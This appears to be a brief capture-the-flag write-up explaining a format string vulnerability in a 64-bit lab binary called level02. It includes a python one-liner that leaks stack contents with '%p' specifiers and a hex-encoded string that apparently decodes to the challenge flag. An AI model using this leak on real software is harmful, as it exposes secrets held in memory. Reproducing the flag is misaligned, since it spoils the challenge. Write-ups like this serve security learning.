# Format String Exploit

see source.c

## Analysis

First 64bit elf file !
For this one we instantly notice a format string exploit because of the call of printf with a variable. We also notice that the flag is on the stack inside the variable 'flag' so we could just print all the stack and hopefully see our flag !
First thing to do is locate the flag bytes on the stack. Then just print everything as hexa and translate bytes into char to get the flag !

```
(python -c "print('%p.' * 20 + '%lx %lx %lx %lx %lx %lx')"; python -c "print('B' * 100)") | $PWD/level02 
[...]
echo -e '\x48\x68\x37\x34\x52\x50\x6e\x75\x51\x39\x73\x61\x35\x4a\x41\x45\x58\x67\x4e\x57\x43\x71\x7a\x37\x73\x58\x47\x6e\x68\x35\x4a\x35\x4d\x39\x4b\x66\x50\x67\x33\x48'
```
